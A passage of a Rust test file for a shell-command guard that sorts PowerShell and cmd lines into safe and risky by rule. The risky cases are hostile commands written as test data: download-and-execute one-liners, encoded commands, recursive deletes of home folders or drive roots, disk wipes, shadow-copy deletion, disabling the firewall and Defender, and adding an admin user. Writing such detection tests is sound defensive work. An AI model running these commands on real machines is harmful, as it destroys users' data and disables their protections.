//! PowerShell and cmd lines, judged against a Windows machine's paths.

mod common;

use common::{check, rules, windows};
use milo_guards_shell::{classify, Paths, Rule, Shell};

#[test]
fn everyday_powershell_is_safe() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Get-ChildItem -Recurse",
            "cargo build; cargo test",
            "git status && git diff",
            "Remove-Item -Recurse -Force .\\target",
            "rm -r -fo target",
            "Remove-Item build\\*.obj",
            "Remove-Item -Path:\"$env:TEMP\\scratch\" -Recurse",
            "Get-ChildItem *.log | Remove-Item",
            "Get-ChildItem -Path .\\out -Filter *.tmp | Remove-Item -Force",
            "Get-ChildItem *.log | ForEach-Object { Remove-Item $_.FullName }",
            "Copy-Item src\\a.txt dist\\a.txt",
            "Move-Item old.txt new.txt",
            "Set-Content -Path notes.txt -Value hi",
            "\"x\" | Out-File log.txt",
            "cargo test > out.txt 2>&1",
            "cargo test > $null",
            "Invoke-WebRequest https://example.com/x.json -OutFile data.json",
            "git push -u origin feature",
            "pwsh -NoProfile -Command \"cargo fmt\"",
            "pwsh -Version",
            "Write-Output 'Remove-Item -Recurse C:\\'",
            "Remove-Item *.log",
            "Remove-Item FileSystem::.\\build -Recurse",
            "[Math]::Round(1.5)",
            "$sw = [Diagnostics.Stopwatch]::StartNew(); $sw.Start()",
            "$name.Replace('a', 'b')",
            "ni -ItemType File notes.txt",
            "[ScriptBlock]::Create($safe)",
        ],
        &[],
    );
}

#[test]
fn risky_powershell() {
    check(
        Shell::PowerShell,
        &windows(),
        &[],
        &[
            ("Remove-Item -Recurse -Force ~", Rule::Delete),
            ("Remove-Item -Recurse -Force $env:USERPROFILE", Rule::Delete),
            ("rm -r -fo $HOME\\Documents", Rule::Delete),
            ("Remove-Item -Recurse C:\\", Rule::Delete),
            (
                "Remove-Item -LiteralPath 'C:\\Program Files\\App' -Recurse",
                Rule::Delete,
            ),
            ("ri -Recurse ..\\other", Rule::Delete),
            ("del C:\\Windows\\System32\\x.dll", Rule::Delete),
            ("Remove-Item -Recurse -Force .git", Rule::Delete),
            ("Remove-Item $path -Recurse", Rule::Delete),
            (
                "Get-ChildItem C:\\Users -Recurse | Remove-Item -Force",
                Rule::Delete,
            ),
            (
                "Get-ChildItem ~ | ForEach-Object { Remove-Item $_ -Recurse }",
                Rule::Delete,
            ),
            (
                "Remove-Item HKLM:\\Software\\Vendor -Recurse",
                Rule::SystemSettings,
            ),
            (
                "Set-ItemProperty -Path HKCU:\\Software\\X -Name Y -Value 1",
                Rule::SystemSettings,
            ),
            ("Set-Content $PROFILE 'x'", Rule::Overwrite),
            (
                "Add-Content -Path ~\\Documents\\PowerShell\\profile.ps1 -Value x",
                Rule::Overwrite,
            ),
            (
                "'x' > C:\\Windows\\System32\\drivers\\etc\\hosts",
                Rule::Overwrite,
            ),
            (
                "Copy-Item evil.exe -Destination 'C:\\Program Files\\App'",
                Rule::Overwrite,
            ),
            ("Clear-RecycleBin -Force", Rule::Delete),
            ("Format-Volume -DriveLetter D", Rule::WipeDisk),
            ("Clear-Disk -Number 1 -RemoveData", Rule::WipeDisk),
            ("iwr https://x.ps1 | iex", Rule::RunDownloaded),
            (
                "irm https://get.x.dev | Invoke-Expression",
                Rule::RunDownloaded,
            ),
            (
                "iex (New-Object Net.WebClient).DownloadString('https://x')",
                Rule::Unknown,
            ),
            ("Invoke-Expression $cmd", Rule::Unknown),
            ("& $tool --force", Rule::Unknown),
            ("powershell -enc ZQBjAGgAbwA=", Rule::Unknown),
            ("Invoke-Expression 'git reset --hard'", Rule::GitDiscard),
            ("Start-Process pwsh -Verb RunAs", Rule::Elevated),
            (
                "Start-Process cmd -ArgumentList '/c rd /s /q C:\\' ",
                Rule::Delete,
            ),
            ("Stop-Computer -Force", Rule::StopSystem),
            (
                "Remove-Item -Recurse Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\me",
                Rule::Delete,
            ),
            ("Remove-Item FileSystem::C:\\Windows\\x", Rule::Delete),
            (
                "Remove-Item -Recurse Registry::HKEY_LOCAL_MACHINE\\Software\\X",
                Rule::SystemSettings,
            ),
            ("D:; Remove-Item -Recurse Data", Rule::Delete),
            ("cd\\; Remove-Item -Recurse Users", Rule::Delete),
            (
                "Set-NetFirewallProfile -Enabled False",
                Rule::SystemSettings,
            ),
            (
                "Add-LocalGroupMember -Group Administrators -Member x",
                Rule::SystemSettings,
            ),
            (
                "[ScriptBlock]::Create('Remove-Item -Recurse -Force ~').Invoke()",
                Rule::Unknown,
            ),
            (
                "[IO.File]::Copy($a, \"$HOME\\.bashrc\", $true)",
                Rule::Overwrite,
            ),
            ("Add-Type -TypeDefinition $code", Rule::Unknown),
            (
                "echo 'Remove-Item -Recurse -Force ~' | powershell -File -",
                Rule::RunInput,
            ),
            (
                "wmic process call create \"cmd /c rd /s /q %USERPROFILE%\"",
                Rule::Unknown,
            ),
            (
                "schtasks /create /tn x /tr \"cmd /c rd /s /q %USERPROFILE%\"",
                Rule::SystemSettings,
            ),
            (
                "forfiles /p %USERPROFILE% /c \"cmd /c del @file\"",
                Rule::Unknown,
            ),
            (
                "[IO.Directory]::Delete('C:\\Users\\me', $true)",
                Rule::Delete,
            ),
            ("(Get-Item ~).Delete()", Rule::Delete),
            ("[IO.File]::WriteAllText($PROFILE, 'x')", Rule::Overwrite),
            (
                "[Diagnostics.Process]::Start('cmd', '/c rd /s /q C:\\')",
                Rule::Unknown,
            ),
            ("New-Item -ItemType File ~/.bashrc -Force", Rule::Overwrite),
            ("ni -ItemType File ~/.bashrc -Force", Rule::Overwrite),
            (
                "sp -Path HKCU:\\Software\\X -Name Y -Value 1",
                Rule::SystemSettings,
            ),
            ("rp -Path HKLM:\\Software\\X -Name Y", Rule::SystemSettings),
            (
                "$env:TEMP = $HOME; Remove-Item -Recurse \"$env:TEMP\\Documents\"",
                Rule::Delete,
            ),
            ("Restart-Computer", Rule::StopSystem),
            ("Set-ExecutionPolicy Unrestricted", Rule::SystemSettings),
            (
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                Rule::SystemSettings,
            ),
            ("git push --force", Rule::GitRemote),
            ("git reset --hard; git clean -fd", Rule::GitDiscard),
            ("cmd /c \"rd /s /q %USERPROFILE%\"", Rule::Delete),
            (
                "git --% x | Remove-Item -Recurse -Force C:\\Users\\me",
                Rule::Delete,
            ),
            (
                "Invoke-Command -ScriptBlock { Remove-Item -Recurse C:\\Data }",
                Rule::Delete,
            ),
        ],
    );
}

#[test]
fn a_powershell_trap_and_event_action_run_later() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "trap { Remove-Item build }",
            "trap { Write-Error $_; continue }",
            "trap [System.Exception] { Remove-Item .\\build -Recurse }",
            "Register-EngineEvent PowerShell.Exiting -Action { Remove-Item build }",
            "Register-ObjectEvent $watcher Changed -Action { Write-Host $Event.SourceEventArgs.Name }",
            "Register-EngineEvent -SourceIdentifier PowerShell.Exiting",
            "Register-ObjectEvent $timer Elapsed",
            "Register-ObjectEvent $timer Elapsed -SourceIdentifier X",
            "Register-ObjectEvent $timer Elapsed X",
            "Register-ObjectEvent -InputObject $o -EventName E $source",
            "Register-EngineEvent PowerShell.Exiting -MessageData $m",
            "Register-EngineEvent PowerShell.Exiting -SupportEvent",
            "Register-EngineEvent X { Remove-Item build }",
            "Register-ObjectEvent $o E X { Remove-Item build }",
            "Register-CimIndicationEvent -ClassName C -SourceIdentifier X",
            "Unregister-Event Cleanup",
        ],
        &[
            ("trap { Remove-Item -Recurse -Force ~ }", Rule::Delete),
            ("trap { Remove-Item -Recurse -Force C:\\ }", Rule::Delete),
            (
                "trap [Exception] { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Remove-Item x; trap { Remove-Item -Recurse -Force ~; continue }",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action:{ Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-ObjectEvent $o Exited -Action { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-ObjectEvent -InputObject $o -EventName Exited -Action { rm -r -fo ~ }",
                Rule::Delete,
            ),
            (
                "Register-WmiEvent -Class Win32_ProcessStartTrace -Action { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-CimIndicationEvent -ClassName X -Action { Remove-Item -Recurse -Force ~ }",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action { Set-Content ~\\.bashrc x }",
                Rule::Overwrite,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action { Restart-Computer }",
                Rule::StopSystem,
            ),
            // A block known only when it runs is a script the guard cannot read.
            (
                "Register-EngineEvent PowerShell.Exiting -Action $block",
                Rule::Unknown,
            ),
            (
                "Register-ObjectEvent $o Exited -Action $block",
                Rule::Unknown,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action ([scriptblock]::Create($text))",
                Rule::Unknown,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action (Get-Content cleanup.ps1 -Raw)",
                Rule::Unknown,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action:$block",
                Rule::Unknown,
            ),
            // An action given by position or in a splat is as unknown as one
            // given by name: the position is the last of the parameters the
            // names leave, per the cmdlet's docs.
            (
                "$b=[scriptblock]::Create('Remove-Item -Recurse -Force ~'); Register-EngineEvent PowerShell.Exiting $b",
                Rule::Unknown,
            ),
            (
                "Register-EngineEvent -SourceIdentifier X $b",
                Rule::Unknown,
            ),
            ("Register-ObjectEvent $t Elapsed X $b", Rule::Unknown),
            (
                "Register-ObjectEvent -InputObject $t -EventName Elapsed -SourceIdentifier X $b",
                Rule::Unknown,
            ),
            ("Register-ObjectEvent $t Elapsed -MessageData $m X $b", Rule::Unknown),
            ("Register-WmiEvent -Class C X $b", Rule::Unknown),
            ("Register-WmiEvent C X $b", Rule::Unknown),
            ("Register-CimIndicationEvent -ClassName C X $b", Rule::Unknown),
            ("Register-CimIndicationEvent -Query Q X (Get-Block)", Rule::Unknown),
            (
                "$p=@{SourceIdentifier='X'; Action=$b}; Register-EngineEvent @p",
                Rule::Unknown,
            ),
            ("Register-ObjectEvent @p", Rule::Unknown),
            ("Register-EngineEvent X -Verbose @p", Rule::Unknown),
            // The action runs after the line has moved.
            (
                "trap { Remove-Item build }; Set-Location ~",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent PowerShell.Exiting -Action { Remove-Item build }; cd ..",
                Rule::Delete,
            ),
            (
                "Register-EngineEvent X -Action { Set-Location ~ }; Remove-Item build",
                Rule::Delete,
            ),
            (
                "pwsh -Command \"trap { Remove-Item -Recurse -Force ~ }\"",
                Rule::Delete,
            ),
        ],
    );
    // Where the line is when the action is registered holds until it moves.
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Set-Location build; trap { Remove-Item out }",
            "trap { Remove-Item out }; Get-ChildItem",
        ],
        &[],
    );
}

#[test]
fn cmd_has_nothing_that_runs_later() {
    // cmd has no `trap`: the word is a program, and what follows are its
    // arguments.
    check(
        Shell::Cmd,
        &windows(),
        &["trap 'rd /s /q C:\\Users' EXIT"],
        &[],
    );
}

#[test]
fn everyday_cmd_is_safe() {
    check(
        Shell::Cmd,
        &windows(),
        &[
            "dir /b",
            "cargo build && cargo test",
            "rd /s /q target",
            "rmdir /s/q build",
            "rd C:\\empty-folder-cmd-refuses-to-delete-unless-empty",
            "del /f /q build\\*.obj",
            "del /s /q %TEMP%\\scratch",
            "copy a.txt b.txt",
            "echo hi > out.txt 2>&1",
            "cargo test 2>nul",
            "if exist build (rd /s /q build) else echo none",
            "for %%f in (*.tmp) do echo %%f",
            "git status | findstr modified",
            "start \"\" notepad notes.txt",
            "shutdown /a",
            "del *.obj",
            "rem build & deploy",
            "cd.. & dir",
            "cd src & del /q *.obj",
        ],
        &[],
    );
}

#[test]
fn risky_cmd() {
    check(
        Shell::Cmd,
        &windows(),
        &[],
        &[
            ("rd /s /q C:\\", Rule::Delete),
            ("rd /S /Q \"%USERPROFILE%\\AppData\"", Rule::Delete),
            ("rmdir /s/q %USERPROFILE%", Rule::Delete),
            ("del /f /s /q C:\\Windows\\Temp2\\*", Rule::Delete),
            ("del /s /q \"C:\\Program Files\\App\"", Rule::Delete),
            ("del %FILE%", Rule::Delete),
            ("for %%f in (*.log) do del %%f", Rule::Delete),
            ("rd /s /q ..\\..", Rule::Delete),
            (
                "echo x >> %SystemRoot%\\System32\\drivers\\etc\\hosts",
                Rule::Overwrite,
            ),
            ("copy /y evil.dll C:\\Windows\\System32", Rule::Overwrite),
            ("robocopy empty C:\\Users\\me\\Documents /MIR", Rule::Delete),
            ("format D: /q", Rule::WipeDisk),
            ("diskpart /s wipe.txt", Rule::WipeDisk),
            ("reg delete HKLM\\Software\\Vendor /f", Rule::SystemSettings),
            (
                "bcdedit /set {current} safeboot minimal",
                Rule::SystemSettings,
            ),
            ("vssadmin delete shadows /all /quiet", Rule::SystemSettings),
            ("wmic shadowcopy delete", Rule::SystemSettings),
            ("net user hacker P4ss /add", Rule::SystemSettings),
            (
                "netsh advfirewall set allprofiles state off",
                Rule::SystemSettings,
            ),
            ("icacls C:\\Windows /grant Everyone:F /T", Rule::Permissions),
            ("takeown /f C:\\Windows\\System32 /r", Rule::Permissions),
            ("shutdown /s /t 0", Rule::StopSystem),
            ("runas /user:Administrator \"cmd /c del x\"", Rule::Elevated),
            ("start \"\" cmd /c rd /s /q C:\\Users", Rule::Delete),
            ("cmd /c \"rd /s /q C:\\\"", Rule::Delete),
            (
                "powershell -Command \"Remove-Item -Recurse -Force ~\"",
                Rule::Delete,
            ),
            (
                "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ZQBj",
                Rule::Unknown,
            ),
            ("set X=1 && rd /s /q C:\\", Rule::Delete),
            ("call %SCRIPT%", Rule::Unknown),
            ("git push --force origin main", Rule::GitRemote),
            ("type script.txt | cmd", Rule::RunInput),
            ("start \"run\" cmd /c rd /s /q C:\\", Rule::Delete),
            ("rd /s /q C:\\Users\\me & echo 'VBS", Rule::Unreadable),
            ("rd /s /q x,C:\\Users\\me", Rule::Delete),
            ("del /q a;C:\\Windows\\x.dll", Rule::Delete),
            ("cd.. & cd.. & rd /s /q Documents", Rule::Delete),
            ("D: & rd /s /q Data", Rule::Delete),
            ("cd \\ & rd /s /q Users", Rule::Delete),
            (
                "set TEMP=%USERPROFILE%\\Documents & rd /s /q %TEMP%",
                Rule::Delete,
            ),
        ],
    );
}

#[test]
fn windows_paths_compare_without_case() {
    check(
        Shell::Cmd,
        &windows(),
        &["rd /s /q c:\\users\\ME\\DEV\\REPO\\target"],
        &[("rd /s /q c:\\USERS\\me", Rule::Delete)],
    );
    let finding = classify("rd /s /q c:\\USERS\\me", Shell::Cmd, &windows());
    assert_eq!(finding.findings()[0].reason, "deletes your home directory");
}

#[test]
fn dev_is_a_real_folder_on_windows() {
    // Only the plain `/dev/null` and `/dev/fd/<digits>` spellings are devices;
    // the others name files on the current drive.
    check(
        Shell::PowerShell,
        &windows(),
        &["Remove-Item -Recurse -Force /dev/null"],
        &[
            ("Remove-Item -Recurse -Force '/dev\\null'", Rule::Delete),
            ("Remove-Item -Recurse -Force '/dev\\fd\\1'", Rule::Delete),
            ("Remove-Item -Recurse -Force /dev/./null", Rule::Delete),
            ("Remove-Item -Recurse -Force //dev/null", Rule::Delete),
            ("Remove-Item -Recurse -Force /dev/fd/../fd/1", Rule::Delete),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &["rd /s /q /dev/null"],
        &[
            ("rd /s /q \\dev\\null", Rule::Delete),
            ("rd /s /q /dev/./null", Rule::Delete),
        ],
    );
}

#[test]
fn a_provider_is_read_before_a_wildcard() {
    check(
        Shell::PowerShell,
        &windows(),
        &["Remove-Item *.log", "Remove-Item build\\*.obj"],
        &[
            ("Remove-Item -Recurse -Force HKCU:*", Rule::SystemSettings),
            ("Remove-Item -Recurse -Force HKLM:*", Rule::SystemSettings),
            ("Remove-Item -Recurse -Force HKCU:\\*", Rule::SystemSettings),
            ("Remove-Item -Recurse hklm:Software*", Rule::SystemSettings),
            ("Remove-Item -Recurse Cert:*", Rule::Delete),
            ("Remove-Item -Recurse Env:*", Rule::Delete),
            (
                "Get-ChildItem HKCU:*.x | Remove-Item -Recurse",
                Rule::SystemSettings,
            ),
            ("Get-ChildItem Cert:* | Remove-Item", Rule::Delete),
        ],
    );
}

#[test]
fn a_drive_relative_path_is_from_its_drives_own_directory() {
    // The working directory is on D:, so `C:` is a drive it is not on.
    let on_d = Paths::new(r"D:\work\repo", r"D:\Users\me", [r"D:\work\repo"]);
    check(
        Shell::PowerShell,
        &on_d,
        &["Remove-Item *.log", "Remove-Item D:*.log"],
        &[
            ("Remove-Item -Recurse C:*", Rule::Delete),
            ("Remove-Item -Recurse c:build", Rule::Delete),
            ("Remove-Item -Recurse C:..", Rule::Delete),
            ("Remove-Item -Recurse D:*", Rule::Delete),
            ("Get-ChildItem C:*.log | Remove-Item", Rule::Delete),
            (
                "Remove-Item -Recurse C:*; Remove-Item -Recurse D:",
                Rule::Delete,
            ),
            ("cd D:\\work; Remove-Item -Recurse C:*", Rule::Delete),
            ("'x' > C:i.sh; bash c:i.sh", Rule::Unknown),
        ],
    );
    check(
        Shell::Cmd,
        &on_d,
        &["del *.obj", "del D:*.obj"],
        &[("del /q C:*", Rule::Delete), ("rd /s /q C:x", Rule::Delete)],
    );
    // On C:, `C:x` is `x` from the working directory.
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Remove-Item C:*.log",
            "Remove-Item -Recurse c:target",
            "Remove-Item -Recurse C:build\\*.obj",
            "Get-ChildItem C:*.log | Remove-Item",
        ],
        &[
            ("Remove-Item -Recurse C:*", Rule::Delete),
            ("Remove-Item -Recurse C:..\\..", Rule::Delete),
            ("Get-ChildItem C:* | Remove-Item -Recurse", Rule::Delete),
            (
                "Get-ChildItem -Path C:* | Remove-Item -Recurse",
                Rule::Delete,
            ),
            ("Get-ChildItem C:?* | Remove-Item -Recurse", Rule::Delete),
            ("Get-ChildItem C:.g* | Remove-Item -Recurse", Rule::Delete),
            (
                "Get-ChildItem -Force C:.* | Remove-Item -Recurse",
                Rule::Delete,
            ),
            ("Remove-Item -Recurse C:", Rule::Delete),
            ("Remove-Item -Recurse D:target", Rule::Delete),
            ("'x' > C:i.sh; bash i.sh", Rule::Unknown),
            // A `cd` moves where `C:x` lands.
            ("cd C:..; Remove-Item -Recurse C:x", Rule::Delete),
            ("cd ..\\..; Remove-Item -Recurse C:x", Rule::Delete),
            ("cd C:..\\..\\..; Remove-Item -Recurse x", Rule::Delete),
        ],
    );
}

#[test]
fn a_provider_qualified_listing_is_judged_by_its_provider() {
    check(
        Shell::PowerShell,
        &windows(),
        &["Get-ChildItem Microsoft.PowerShell.Core\\FileSystem::*.log | Remove-Item"],
        &[
            (
                "Get-ChildItem Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER* | Remove-Item -Recurse",
                Rule::SystemSettings,
            ),
            (
                "Get-ChildItem Microsoft.PowerShell.Core\\Registry::* | Remove-Item -Recurse",
                Rule::SystemSettings,
            ),
            (
                "Get-ChildItem Microsoft.PowerShell.Core\\FileSystem::C:* | Remove-Item -Recurse",
                Rule::Delete,
            ),
            (
                "Get-ChildItem Registry::HKEY_CURRENT_USER*.x | Remove-Item -Recurse",
                Rule::SystemSettings,
            ),
            (
                "Get-ChildItem FileSystem::D:\\data\\* | Remove-Item -Recurse",
                Rule::Delete,
            ),
        ],
    );
}

#[test]
fn a_bare_drive_is_that_drives_working_directory() {
    // The working directory is on D:, with a second workspace on C:.
    let paths = Paths::new(r"D:\work\repo", r"D:\Users\me", [r"D:\work\repo", r"C:\ws"]);
    check(
        Shell::PowerShell,
        &paths,
        &[
            "Remove-Item -Recurse target",
            "Remove-Item -Recurse D:target",
        ],
        &[
            ("cd C:; Remove-Item -Recurse ws\\sub", Rule::Delete),
            ("cd C:; Remove-Item -Recurse ..\\ws\\sub", Rule::Delete),
            ("C:; Remove-Item -Recurse ws\\sub", Rule::Delete),
            ("Remove-Item -Recurse C:", Rule::Delete),
            ("cd C:x; Remove-Item -Recurse ws", Rule::Delete),
        ],
    );
    check(
        Shell::Cmd,
        &paths,
        &["rd /s /q target"],
        &[
            ("C: & rd /s /q ws\\sub", Rule::Delete),
            ("rd /s /q C:", Rule::Delete),
        ],
    );
    // On C:, the bare drive is the working directory, the workspace itself.
    let finding = classify("Remove-Item -Recurse C:", Shell::PowerShell, &windows());
    assert_eq!(finding.findings()[0].reason, "deletes the whole workspace");
}

#[test]
fn a_listing_of_a_drives_root_is_the_root() {
    let lines = [
        "Get-ChildItem C:\\* | Remove-Item -Recurse",
        "Get-ChildItem -Path C:\\* | Remove-Item -Recurse",
        "Get-ChildItem C:/* | Remove-Item -Recurse",
        "Get-ChildItem -Force C:\\.* | Remove-Item -Recurse",
        "Get-ChildItem -Recurse C:\\* | Remove-Item -Recurse",
        "Get-ChildItem FileSystem::C:\\* | Remove-Item -Recurse",
        "Get-ChildItem Microsoft.PowerShell.Core\\FileSystem::C:\\* | Remove-Item -Recurse",
    ];
    // From the workspace and from a folder inside it.
    let inside = Paths::new(
        r"C:\Users\me\dev\repo\app",
        r"C:\Users\me",
        [r"C:\Users\me\dev\repo"],
    );
    for paths in [windows(), inside] {
        let rows: Vec<_> = lines.iter().map(|line| (*line, Rule::Delete)).collect();
        check(Shell::PowerShell, &paths, &[], &rows);
        for line in lines {
            let found = classify(line, Shell::PowerShell, &paths);
            assert_eq!(
                found.findings()[0].reason,
                "deletes the root of the disk",
                "{line}"
            );
        }
    }
}

#[test]
fn a_script_run_from_a_place_the_guard_cannot_read_is_risky() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "cd sub; cargo test",
            "cd C:\\Users\\me\\dev\\repo\\sub; bash C:\\Users\\me\\dev\\repo\\sub\\x.sh",
        ],
        &[
            ("cd C:; 'x' > i.sh; bash C:i.sh", Rule::Unknown),
            ("cd sub; 'x' > i.sh; bash C:i.sh", Rule::Unknown),
            ("cd $x; 'x' > i.sh; bash i.sh", Rule::Unknown),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[],
        &[("cd C: & echo x > i.sh & bash C:i.sh", Rule::Unknown)],
    );
}

#[test]
fn a_windows_script_run_after_a_cd_to_an_unknown_place_needs_a_write_to_be_risky() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Set-Location $PSScriptRoot; python x.py",
            "cd $dir; bash x.sh 2>$null",
        ],
        &[
            ("cd $dir; 'x' > i.sh; bash i.sh", Rule::Unknown),
            ("'x' > i.sh; cd $dir; bash ..\\i.sh", Rule::Unknown),
            ("cd $dir; bash x.sh > $out", Rule::Unknown),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &["cd %X% & python run.py"],
        &[("cd %X% & echo x > i.sh & bash i.sh", Rule::Unknown)],
    );
    // A device is no write that could be a script: only the unplaceable
    // `cd` is found for it, never an unknown script.
    for (shell, line) in [
        (Shell::PowerShell, "cd $dir; bash x.sh > $null"),
        (Shell::PowerShell, "cd $dir; python x.py > NUL"),
        (Shell::Cmd, "cd %X% & bash x.sh > nul"),
    ] {
        let found = rules(line, shell, &windows());
        assert!(!found.contains(&Rule::Unknown), "{line}: {found:?}");
    }
}

#[test]
fn a_windows_wildcard_can_match_a_dot_name() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Remove-Item -Recurse *.tmp",
            "Remove-Item -Recurse -Force *.TMP",
            "Remove-Item -Recurse -Force *gitx",
            "Remove-Item -Recurse -Force ?git2",
            "Remove-Item -Recurse -Force '[!x]git'",
            "Remove-Item -Recurse -Force *\\bin, *\\obj",
            "Remove-Item -Recurse -Force src\\*\\bin",
            "Remove-Item -Recurse -Force src\\*git",
            "Remove-Item -Recurse -Force node_modules\\*\\dist",
            "Remove-Item -Recurse -Force *\\*.o",
        ],
        &[
            ("Remove-Item -Recurse -Force *git", Rule::Delete),
            ("Remove-Item -Recurse -Force ?git", Rule::Delete),
            ("Remove-Item -Recurse -Force *GIT", Rule::Delete),
            ("Remove-Item -Recurse -Force '[!.]git'", Rule::Delete),
            ("Remove-Item -Recurse -Force '[^.]git'", Rule::Delete),
            ("Remove-Item -Recurse -Force '`.gi?'", Rule::Delete),
            ("Remove-Item -Recurse -Force ????", Rule::Delete),
            ("Remove-Item -Recurse -Force *\\objects", Rule::Delete),
            ("Remove-Item -Recurse -Force ????\\HEAD", Rule::Delete),
            ("Remove-Item -Recurse -Force *g?t\\objects", Rule::Delete),
            (
                "Remove-Item -Recurse -Force *\\bin, *\\objects",
                Rule::Delete,
            ),
            ("Get-ChildItem *git | Remove-Item -Recurse", Rule::Delete),
            (
                "Get-ChildItem *\\objects | Remove-Item -Recurse",
                Rule::Delete,
            ),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[
            "rd /s /q *gitx",
            "del /q *.tmp",
            "rd /s /q *\\bin",
            "rd /s /q src\\*\\bin",
        ],
        &[
            ("rd /s /q *git", Rule::Delete),
            ("rd /s /q ?git", Rule::Delete),
            ("rd /s /q ?GIT", Rule::Delete),
            ("rmdir /s /q *g?t", Rule::Delete),
            ("rd /s /q [.]git", Rule::Delete),
            ("rd /s /q *\\objects", Rule::Delete),
            ("rd /s /q ????\\HEAD", Rule::Delete),
        ],
    );
    let finding = classify("rd /s /q *git", Shell::Cmd, &windows());
    assert_eq!(
        finding.findings()[0].reason,
        "deletes a hidden file such as the repository's history"
    );
    let quoted = classify(
        "Remove-Item -Recurse -Force '[!.]git'",
        Shell::PowerShell,
        &windows(),
    );
    assert_eq!(
        quoted.findings()[0].reason,
        "deletes a hidden file such as the repository's history"
    );
}

#[test]
fn star_dot_star_is_every_entry_on_windows() {
    check(
        Shell::Cmd,
        &windows(),
        &["del /q build\\*.*"],
        &[("del /q *", Rule::Delete), ("del /q *.*", Rule::Delete)],
    );
    check(
        Shell::PowerShell,
        &windows(),
        &["Remove-Item -Recurse build\\*.*"],
        &[("Remove-Item -Recurse -Force *.*", Rule::Delete)],
    );
    let all = classify("del /q *", Shell::Cmd, &windows());
    let dotted = classify("del /q *.*", Shell::Cmd, &windows());
    // Judged alike: the same rule and reason (only the target text differs).
    assert_eq!(all.findings()[0].rule, dotted.findings()[0].rule);
    assert_eq!(all.findings()[0].reason, dotted.findings()[0].reason);
    assert_eq!(dotted.findings()[0].reason, "deletes the whole workspace");
}

#[test]
fn a_listing_is_judged_as_the_delete_of_its_pattern_is() {
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Get-ChildItem *.log | Remove-Item",
            "Get-ChildItem -Force x*\\..\\*.tmp | Remove-Item -Recurse -Force",
            "Get-ChildItem -Force *\\bin | Remove-Item -Recurse -Force",
        ],
        &[
            ("Remove-Item -Recurse -Force *\\modules", Rule::Delete),
            ("Remove-Item -Recurse -Force *\\lfs", Rule::Delete),
            ("Remove-Item -Recurse -Force *\\worktrees", Rule::Delete),
            (
                "Get-ChildItem -Force x*\\..\\*git | Remove-Item -Recurse -Force",
                Rule::Delete,
            ),
            (
                "Get-ChildItem -Force x*\\..\\*\\objects | Remove-Item -Recurse -Force",
                Rule::Delete,
            ),
            (
                "Get-ChildItem -Force src\\*\\..\\..\\*git | Remove-Item -Recurse -Force",
                Rule::Delete,
            ),
            ("Get-ChildItem -Force *git | Remove-Item", Rule::Delete),
        ],
    );
    let listed = classify(
        "Get-ChildItem -Force *git | Remove-Item",
        Shell::PowerShell,
        &windows(),
    );
    assert_eq!(
        listed.findings()[0].reason,
        "deletes a hidden file such as the repository's history"
    );
}

#[test]
fn a_pattern_that_picks_names_in_a_temporary_folder_is_temporary_files_on_windows() {
    check(
        Shell::PowerShell,
        &windows(),
        &["Get-ChildItem C:\\Users\\me\\AppData\\Local\\Temp\\*.log | Remove-Item"],
        &[(
            "Remove-Item -Recurse C:\\Users\\me\\AppData\\Local\\Temp\\*",
            Rule::Delete,
        )],
    );
}

#[test]
fn windows_drops_trailing_dots_and_spaces_from_a_name() {
    // `.git.` and `.git ` are `.git`; the same names elsewhere are the plain
    // names they were.
    check(
        Shell::PowerShell,
        &windows(),
        &[
            "Remove-Item notes.txt.",
            "Remove-Item 'build '",
            "Remove-Item -Recurse 'target. .'",
            "Remove-Item -Recurse -Force src\\.git.",
            "Remove-Item -Recurse build",
        ],
        &[
            ("Remove-Item -Recurse -Force .git.", Rule::Delete),
            ("Remove-Item -Recurse -Force '.git '", Rule::Delete),
            ("Remove-Item -Recurse -Force '.GIT. .'", Rule::Delete),
            ("Remove-Item -Recurse -Force .git...", Rule::Delete),
            (
                "Remove-Item -Recurse -Force '.\\.git .\\objects'",
                Rule::Delete,
            ),
            ("Remove-Item -Recurse -Force src\\..\\.git.", Rule::Delete),
            ("Remove-Item -Recurse -Force 'src\\.. \\.git'", Rule::Delete),
            ("Remove-Item -Recurse -Force '.git.\\config'", Rule::Delete),
            ("Remove-Item -Recurse -Force ~\\.ssh.", Rule::Delete),
        ],
    );
    check(
        Shell::Cmd,
        &windows(),
        &[
            "del notes.txt.",
            "del /q \"notes.txt \"",
            "rd /s /q target",
            "rd /s /q target.",
            "del /q build\\*.obj.",
            "del C:\\Users\\me\\dev\\repo\\build.",
            "del src\\.git.",
        ],
        &[
            ("rd /s /q .git.", Rule::Delete),
